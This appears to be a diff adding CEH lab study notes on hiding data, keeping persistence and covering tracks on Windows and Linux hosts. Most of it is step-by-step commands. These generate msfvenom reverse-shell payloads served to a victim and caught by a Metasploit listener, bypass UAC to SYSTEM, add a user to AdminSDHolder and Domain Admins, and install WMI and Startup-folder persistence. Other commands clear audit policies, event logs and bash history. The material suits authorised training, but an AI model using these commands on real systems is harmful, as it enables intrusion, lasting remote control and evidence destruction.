+$ mklink backdoor.exe readme.txt:calc.exe      (link backdoor.exe with readme.txt:calc.exe)
+$ backdoor.exe   (calculator program will execute)
+
+$ copy file dir   (Copy file and paste in dir)
+
+$ dir /r    (View files hidden in Alternate Data Streams)
+
+
+
+
+
+
+
+d. Hide data using White Space Steganography: Snow - Whitespace Steganography Tool
+
+PS: Snow is a program that conceals messages in text files by appending tabs and spaces to the end of lines, and that extracts hidden messages from files containing them.
+
+Step 1: Copy and Paste Snow on Desktop
+Step 2:
+$ cd C:\Users\Admin\Desktop\Snow
+$ notepad readme.txt       -> type HELLO WORLD!! and put dotted lines under it
+$ snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt   (magic = password, readme2.txt = new file created in the location containing the content of readme.txt with the message)
+$ snow -C -p "magic" readme2.txt   (Reveals hidden texts)
+Open readme2.txt with notepad -> shows "Hello World!" -> Edit-> Select All (shows the mark of the hidden files in white)
+
+
+
+
+
+e. Image steganography using OpenStego and StegOnline
+
+OpenStego is an image steganography tool that hides data inside images. It uses the DES algorithm for data encryption, in conjunction with MD5 hashing to derive the DES key from the provided password
+
+OpenStego -> Hide Data -> Message File (Import txt file to hide) -> Cover File (Import .jpg, .png, .bmp file you want to hide text in) -> Output Stego File (Select location to save file) -> Hide File
+
+OpenStego -> Extract Data -> Input Stego File (choose file to extract) -> Output Folder for message file (Select location to save extracted message) -> Extract Data
+
+StegOnline is a web-based, enhanced and open-source port of StegSolve.
+
+https://stegonline.georgeom.net/upload -> Upload Image (select image to hide message in) -> Embed Files/Data -> {R G B} 5 -> Input Data (type some text) -> Go -> Download Extracted Data -> Select Location and save
+
+https://stegonline.georgeom.net/upload -> Upload Image (select image to extract data from) -> Extract Files/Data -> {R G B} 5 -> Go -> Download Extracted data -> Choose location and save.
+
+
+
+
+f. Maintain persistence by abusing boot or logon autostart execution
+
+https://www.howtogeek.com/208224/how-to-add-a-program-to-startup-in-windows/
+
+- To add a program to startup, Press Windows+R to open the “Run” dialog box.
+- Type “shell:startup” and then hit Enter to open the “Startup” folder.
+- Create a shortcut in the “Startup” folder to any file, folder, or program's executable file( right-drag the executable file from the original location into the Startup folder. It will open on startup the next time you boot.
+
+EC Council Way
+
+Step 1: Host/Target: Establish a Meterpreter Shell and Elevate Privilege to SYSTEM.
+
+
+$ sudo su
+$ cd
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/exploit.exe 
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ ls -la /var/www/html/ | grep share
+$ cp /home/attacker/Desktop/exploit.exe /var/www/html/share/
+$ service apache2 start 
+
+Start the Metasploit Listener
+
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.10.1.13
+> set lport 444
+> run
+
+Go to Victim Machine and run the Exploit
+
+http://10.10.1.13/share     (On Browser - Mozilla)
+Download and Run exploit.exe  (this opens a Meterpreter session with the Host/Attacker)
+
+Confirm Current privilege
+
+> getuid    (Windows11\Admin)
+
+Bypass User Account Control and get Unrestricted Access
+
+> background
+> search bypassuac
+> use exploit/windows/local/bypassuac_fodhelper
+> set session 1
+> show option
+> set LHOST 10.10.1.13
+> set TARGET 0
+> exploit
+> getsystem -t 1
+> getuid     (NT AUTHORITY \SYSTEM - we now have system privilege)
+
+Step 2: Dump a Payload at the Startup Folder, using Port 8080
+
+> cd "C:\\ProgramData\\Start Menu\\Programs\\Startup"
+> pwd      (confirm we are in Startup folder)
+Open a new terminal;
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe
+Navigate to the previous terminal/meterpreter shell
+> upload /home/attacker/payload.exe       (upload the payload to the startup folder)
+
+Step 3: Infect the target and open a new meterpreter shell on Port 8080
+
+Sign in as Admin on Windows11 (target) and restart the machine
+Open a new meterpreter shell on port 8080
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.10.1.13
+> set lport 8080
+> exploit 
+
+Login to target as Admin and restart. A meterpreter shell is opened on the host.
+
+Any time Admin restarts the system, a reverse shell is opened until the payload is detected.
+
+
+
+
+
+
+g. Maintain domain persistence by exploiting Active Directory Objects
+
+AdminSDHolder is an Active Directory container with the default security permissions, it is used as a template for AD Protected Accounts like Domain Admins, Enterprise Admins, Administrators etc to protect them from unintentional modification of permissions.
+
+SDProp is a process that runs every 60mins to synchronize ACL in AdminSDHolder with those on Protected Accounts. If ACLs on protected accounts does not match that in AdminSDHolder, it will automatically update to correspond to AdminSDHolder.
+
+If a user account is added into the ACL of AdminSDHolder, the user will acquire "GenericAll" permissions which is equivalent to domain administrators.
+
+
+Step 1: Host/Target: Establish a Meterpreter Shell with Host Using Administrator Account
+
+$ sudo su
+$ cd
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/exploit.exe 
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ ls -la /var/www/html/ | grep share
+$ cp /home/attacker/Desktop/exploit.exe /var/www/html/share/
+$ service apache2 start 
+
+Start the Metasploit Listener
+
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.10.1.13
+> set lport 444
+> run
+
+Go to Victim Machine and run the Exploit
+
+http://10.10.1.13/share     (On Browser - Mozilla)
+Download and Run exploit.exe  (this opens a Meterpreter session with the Host/Attacker)
+
+Confirm Current privilege
+
+> getuid    (CEH\Administrator  - Domain Administrator Privilege)
+
+Step 2: Use PowerSploit (PowerTools-master) to add Martin (an ordinary user account in AD) to the AdminSDHolder
+
+> upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads 
+> shell
+> cd C:\Windows\System32
+> powershell
+> cd C:\Users\Administrator\Downloads\PowerView
+> Import-Module ./powerview.psm1
+> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
+> Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs  (Check permissions assigned to Martin. ActiveDirectoryRights: GenericAll = meaning martin now has Domain Admin Rights).
+
+Step 3: Reduce the amount of time this change will take effect from 60 minuts to 3mins by adding a key to HKLM registry
+
+> REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
+
+Logon to server22 -> Server Manager -> Tools -> Active Directory Users and Computers -> View -> Advanced Features -> CEH.com -> System -> Right-click AdminSDHolder -> Properties -> Security (Martin is added as member with full access).
+
+Step 4: Add Martin to Domain Admins since he is already having all the permissions.
+
+> net group "Domain Admins" Martin /add /domain
+
+Go to Server Manager -> Active Directory Users and Computers -> Users -> right-click Martin J -> Properties -> Member Of (Martin is now memeber of Domain Admins)
+
+Sign-out and sign-in as CEH\Martin   password apple. You can sign in, showing Martin is part of Domain admin.
+
+Open Powershell window and type;
+> dir \\10.10.1.22\C$  (Domain Controller is now assessible to Martin, hence domain persistence has been established).
+
+
+
+
+
+
+h. Privilege escalation and maintain persistence using WMI
+
+Step 1: Host/Target: Create 2 Payloads and Establish a Meterpreter Shell with Host Using Administrator Account
+
+$ sudo su
+$ cd
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/exploit.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/wmi.exe 
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ ls -la /var/www/html/ | grep share
+$ cp /home/attacker/Desktop/exploit.exe /var/www/html/share/
+$ service apache2 start 
+
+Start the Metasploit Listener
+
+$ msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.10.1.13
+> set lport 444
+> run
+
+Go to Victim Machine and run the Exploit
+
+http://10.10.1.13/share     (On Browser - Mozilla)
+Download and Run exploit.exe  (this opens a Meterpreter session with the Host/Attacker)
+
+Confirm Current privilege
+
+> getuid    (SERVER2019\Administrator  - Domain Administrator Privilege)
+
+Step 2: Use PowerSploit (Wmi-Persistence-master) that will be used to install WMI event subscription 
+
+> upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
+> load powershell
+> powershell_shell
+> Import-Module ./WMI-Persistence.ps1
+> Install-Persistence -Trigger Startup -Payload "C:\Users\Administrator\Downloads\wmi.exe"
+
+Step 3: Create an Alternative Meterpreter shell and terminate the current shell
+On another terminal with root privilege
+
+> msfconsole
+> use exploit/multi/handler
+> set payload windows/meterperter/reverse_tcp
+> set lhost 10.10.1.13
+> set lport 444
+> exploit
+
+Open the previous terminal
+> ctrl+c
+> y       (terminate the shell/session)
+
+Restart the server.
+The previous shell will be closed but the new shell will open a new session
+> getuid   (NT AUTHORITY\SYSTEM)
+Whenever the system is restarted, a session is created.
+
+
+
+
+
+
+
+i. Covert channels using Covert_TCP     (Remember - Apply a display filter: tcp)
+
+attacker@parrot:~$ scp message.txt ubuntu@10.10.1.9:/home/ubuntu/receive.txt   (copy a file from one Linux machine to another through SCP)
+
+PS: The Covert_TCP program manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted inside an IP header. This is useful when bypassing firewalls and sending data with legitimate-looking packets that contain no data for sniffers to analyze.
+
+Step 1: Download/paste and Compile covert_tcp.c file on Sending Machine (target)
+
+$ mkdir send   (create a folder)
+$ echo "This Message" > message.txt     (create a file with text "This Message"
+Navigate to windows 11, copy \Covering Tracks Tools\Covert_TCP\covert_tcp.c file and paste on send folder.
+$ cd send
+$ cc -o covert_tcp covert_tcp.c      (compile covert_tcp file)
+
+Step 2: Start tcpdump, Download/Copy and Compile covert_tcp.c file on Receiving Machine (Host - Ubuntu)
+
+$ sudo su
+$ tcpdump -nvvx port 8888 -i lo     (start a tcpdump)
+Make a folder named Receive. Copy and paste covert_tcp.c in the Receive folder. Open a new terminal
+$ cc -o covert_tcp covert_tcp.c     (compile covert_tcp.c)
+
+Step 3: Create a Listener on the Host Machine (Ubuntu)
+
+$ sudo su    (get super user access)
+$ ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/..Receive/receive.txt
+
+Step 4: Send the contents of message.txt file with Wireshark on (Target - Parrot)
+
+Open Wireshark (Applications -> Pentesting -> Information Gathering -> Wireshark)
+Minimize Wireshark and switch back to the originalterminal window.
+$ sudo su
+$ ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/messages.txt 
+The message is sent
+
+Go to terminal running tcpdump and ctrl+c to end it. It will show that no packet was captured. 
+Open
+$ ..Receive/receive.txt   (You will see the full message.)
+
+Step 5: Observe in Wireshark
+- Stop Capture
+- Apply a display filter: tcp   (show only TCP packet)
+
+
+
+
+
+
+4. Clear logs to hide the evidence of compromise
+
+This task will demonstrate how the system logs can be cleared, manipulated, disabled, or erased using various methods.
+
+
+- Disable Auditing: Disable the auditing features of the target system
+- Clearing Logs: Clears and deletes the system log entries corresponding to security compromise activities
+- Manipulating Logs: Manipulate logs in such a way that an intruder will not be caught in illegal actions
+- Covering Tracks on the Network: Use techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and TCP parameters to cover   tracks on the network.
+- Covering Tracks on the OS: Use NTFS streams to hide and cover malicious files in the target system
+- Deleting Files: Use command-line tools such as Cipher.exe to delete the data and prevent its future recovery
+- Disabling Windows Functionality: Disable Windows functionality such as last access timestamp, Hibernation, virtual memory, and system restore   points to cover tracks
+
+
+
+
+a. View, enable, and clear audit policies using Auditpol
+
+Run cmd as Administrator
+$ auditpol /get /category:*   (view all the audit polocies)
+$ auditpol /set /category:"system","account logon" /success:enable /failure:enable  (enable account logo audit policies)
+$ auditpol /get category:*       (confirm the audit policies are enabled)
+$ auditpol /clear /y     (clear the audit policies)
+$ auditpol /get /category:*      (confirm the audit policies are cleared - No Auditing means system is not logging audit policies)
+
+
+
+b. Clear Windows machine logs using various utilities
+
+	- Clear_Event_Viewer_Logs.bat
+Right-click and run as administrator. It willrun automatically to clear the event logs.
+PS: This utility can be run through command prompt or PowerShell, and it uses a BAT file to delete security, system, and application logs on the target system.
+
+	- wevtutil
+Run cmd as administrator
+$ wevtutil el   (el or enum-logs = lists event log names)
+$ wevtutil cl system   (or wevtutil cl [log_name]. cl or clear-log clears a log, log_name ex: = system, application or security logs)  
+
+Note: wevtutil is a command-line utility used to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, run queries, and export, archive, and clear logs.
+
+	- Cipher.exe
+$ cipher /w:[Drive or Folder or File Location] eg
+$ cipher /w:C:     (Note: Here, we are encrypting the deleted files on the C: drive. You can run this utility on the drive, folder, or file of your choice.)
+Note: Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. This command also assists in encrypting and decrypting data in NTFS partitions.
+
+
+
+
+
+
+c. Clear Linux machine logs using the BASH shell
+
+$ more ~/.bash_history     (view saved command history)
+$ export HISTSIZE=0    (Disable BASH shell from saving history. HISTSIZE: determines the number of commands to be saved)
+$ history -c    (clear stored history)
+$ history -w    (delete the history of the current shell, leaving the command history of other shells unaffected)
+$ shred ~/.bash_history    (shred the history file, making its content unreadable. if an investigator locates the file, they can't read the content)
+$ more ~/.bash_history   (view the bash history)
+
+$ shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit    (combine all the commands in one command)
+
+
+
+
+d. Hiding artifacts in windows and Linux machines
+
+Artifacts are the objects in a computer system that hold important information about the activities that are performed by user. Every operating system hides its artifacts such as internal task execution and critical system files.
+
+	- Windows
+Run cmd as administrator
+$ cd C:\Users\Admin\Desktop
+$ mkdir Test
+$ dir   (check contents of Desktop)
+$ attrib +h +s +r Test          (hide the Test folder)
+$ dir    (the directory Test is hidden)
+$ attrib -h -s -r Test   (Unhide Test directory)
+$ dir   (it shows)
+
+$ net user Test /add   (add a user Test in the machine)
+$ net user Test /active:yes      (activate the Test account)
+
+$ net user Test /active:no   (hide the user account Test)
+
+	- Linux
+$ cd Desktop
+$ mkdir Test
+$ cd Test
+$ >> Sample.txt  (create Sample.txt file)
+$ touch Sample.txt
+$ ls
+$ touch .Secret.txt       (create hidden file Secret.txt)
+$ ls      (Sample.txt is shown, Secret.txt is hidden)
+$ ls -al    (.Sample.txt is shown)
+
+
+
+
+
+
+e. Clear Windows machine logs using CCleaner
+
+CCleaner is a system optimization, privacy, and cleaning tool. It allows you to remove unused files and cleans traces of Internet browsing details from the target PC. With this tool, you can very easily erase your tracks.
+
+Install CCleaner - CCleaner Professional Setup -> deselect View release notes -> Run CCleaner -> Start My Trial -> Health Check -> Start -> Make it Better (After the scan)
+
+Custom Clean (Select particular places to clean).
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
